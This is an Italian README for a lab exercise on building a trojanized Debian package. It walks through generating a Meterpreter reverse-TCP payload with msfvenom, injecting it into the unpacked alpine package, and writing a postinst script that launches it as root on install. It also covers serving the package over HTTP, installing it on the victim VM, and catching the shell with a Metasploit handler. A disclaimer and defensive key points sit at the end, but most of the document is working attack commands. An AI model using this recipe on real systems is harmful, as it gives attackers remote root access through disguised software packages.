Lab-12! Clicca "+" → Create new file, scrivi:
lab-12-trojan-deb/README.md
Incolla questo:
markdown# Lab 12 — Trojan .deb

## Disclaimer
Progetto esclusivamente educativo in ambiente isolato. Uso al di fuori del laboratorio è illegale.

## Obiettivo
Creare un pacchetto .deb apparentemente legittimo con payload Meterpreter nascosto per comprendere il vettore di attacco supply chain su sistemi Linux.

## Ambiente
| VM | IP | Ruolo |
|---|---|---|
| Kali Linux | 10.0.2.6 | Attaccante (listener Metasploit) |
| Lubuntu | 10.0.2.15 | Vittima |

## Struttura .deb trojanizzato
mailTrojan/
├── DEBIAN/
│   ├── control
│   ├── md5sums
│   └── postinst     <-- PUNTO DI INIEZIONE
└── usr/
└── bin/
└── malicious  <-- PAYLOAD NASCOSTO

## Creazione payload su Kali
```bash
sudo msfvenom -a x86 --platform linux \
    -p linux/x86/meterpreter/reverse_tcp \
    LHOST=10.0.2.6 LPORT=443 \
    -b "\x00" -f elf -o malicious

sudo chmod 775 malicious
```

## Scompatta il .deb legittimo
```bash
mkdir mailTrojan
dpkg-deb -R alpine_2.26+dfsg-1build1_amd64.deb mailTrojan
```

## Inietta il payload
```bash
cp malicious mailTrojan/usr/bin/
chmod +x mailTrojan/usr/bin/malicious
```

## Modifica postinst
```bash
#!/bin/sh
TARGET="/usr/bin/malicious"
PIDFILE="/var/run/malicious.pid"

if [ -f "$TARGET" ]; then
    chmod 2755 "$TARGET"
else
    exit 1
fi

if [ -x "$TARGET" ]; then
    "$TARGET" &
    echo $! > "$PIDFILE"
fi

exit 0
```

## Ricompatta e distribuisci
```bash
chmod +x mailTrojan/DEBIAN/postinst
sudo dpkg-deb --build ./mailTrojan

# Server HTTP per distribuzione
python3 -m http.server 8080

# Su Lubuntu — download e installazione
wget http://10.0.2.6:8080/mailTrojan.deb
sudo dpkg -i mailTrojan.deb
```

## Listener Metasploit su Kali
```bash
sudo msfconsole -q -x "use exploit/multi/handler; \
    set PAYLOAD linux/x86/meterpreter/reverse_tcp; \
    set LHOST 10.0.2.6; \
    set LPORT 443; run"
```

## Verifica sulla vittima
```bash
ps aux | grep malicious
# root  5007  /bin/sh /var/lib/dpkg/info/alpine.postinst
# root  5009  /usr/bin/malicious
# root  5025  /bin/sh   <-- shell Meterpreter
```

## Differenza payload staged vs stageless
| Tipo | Flag msfvenom | Dimensione | Come funziona |
|---|---|---|---|
| Stageless | meterpreter_reverse_https | ~1MB | Tutto il payload nel file ELF |
| Staged | meterpreter/reverse_tcp | ~234 byte | Solo stager, scarica payload da Metasploit |

## Risultati
- Pacchetto .deb trojanizzato funzionante
- Sessione Meterpreter aperta su Kali dopo dpkg -i
- Processo malicious visibile in ps aux della vittima

## Concetti chiave
- I package manager eseguono postinst con privilegi elevati
- Verificare sempre la firma GPG dei pacchetti prima di installarli
- Usare solo repository ufficiali verificati
- Difesa: GPG signing, EDR, principio del minimo privilegio
